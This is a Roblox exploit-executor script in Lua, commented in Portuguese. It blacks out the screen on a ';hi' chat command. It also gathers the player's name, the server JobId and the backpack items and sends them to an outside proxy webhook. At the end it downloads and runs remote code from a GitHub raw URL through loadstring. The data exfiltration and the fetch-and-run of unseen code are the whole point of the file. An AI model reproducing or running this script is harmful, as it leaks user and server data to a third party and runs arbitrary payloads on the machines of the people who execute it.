local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

-- Função que cria a GUI preta fullscreen
local function criarGuiPreta()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreenGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 0
    frame.Parent = screenGui
end

-- Evento para ouvir o chat do jogador local
player.Chatted:Connect(function(msg)
    if msg:lower() == ";hi" then
        criarGuiPreta()
    end
end)

-- Coleta dados para enviar webhook
local username = player.Name
local jobId = game.JobId -- ID único do servidor atual

local items = {}
for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") then
        table.insert(items, item.Name)
    end
end
local itemsText = (#items > 0) and table.concat(items, ", ") or "Nenhum item"

local data = {
    username = "Roblox Bot",
    content = "",
    embeds = {{
        title = "🎮 Jogador Conectado",
        color = 65280,
        fields = {
            {
                name = "Nome do Player",
                value = username,
                inline = true
            },
            {
                name = "ID do Servidor (JobId)",
                value = jobId,
                inline = true
            },
            {
                name = "Itens na Backpack",
                value = itemsText,
                inline = false
            }
        },
        footer = {
            text = "Enviado pelo script Roblox"
        },
        timestamp = DateTime.now():ToIsoDate()
    }}
}

local headers = {
    ["Content-Type"] = "application/json"
}

local body = HttpService:JSONEncode(data)

local webhookUrl = "https://proxy-f74p.vercel.app/api/send" -- seu proxy webhook

local requestFunction = (syn and syn.request) or http_request or request or (http and http.request)
if requestFunction then
    requestFunction({
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = body
    })
else
    warn("Executor não suporta requisições HTTP.")
end

-- Seu wait + loadstring original (se quiser manter)
task.wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/view.lua"))()
